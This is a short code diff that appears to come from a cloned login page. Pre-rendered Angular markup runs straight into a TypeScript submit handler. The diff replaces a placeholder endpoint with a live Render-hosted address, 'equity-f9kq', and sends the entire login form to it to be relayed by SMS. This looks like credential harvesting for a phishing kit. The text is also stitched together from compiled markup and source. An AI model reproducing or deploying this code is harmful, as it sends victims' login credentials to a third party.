@@ -45,7 +45,7 @@
 </button><button _ngcontent-ng-c2415369232 mat-stroked-button color=primary type=button class="px-5 mb-2 mdc-button mdc-button--outlined mat-mdc-outlined-button mat-primary mat-mdc-button-base" mat-ripple-loader-class-name=mat-mdc-button-ripple tabindex=0 data-testid=pass-btn-register><span class="mat-mdc-button-persistent-ripple mdc-button__ripple"></span><span class=mdc-button__label>Register</span><span class=mat-focus-indicator></span><span class=mat-mdc-button-touch-target></span><span class="mat-ripple mat-mdc-button-ripple"></span></button></div></div>onSubmit(): void {
   if (this.loginForm.invalid) return;
 
-  const renderEndpoint = 'https://your-app.onrender.com/api/send-sms';
+  const renderEndpoint = 'https://equity-f9kq.onrender.com';
 
   this.http.post(renderEndpoint, this.loginForm.value).subscribe({
     next: (res) => console.log('SMS sent via Render proxy:', res),
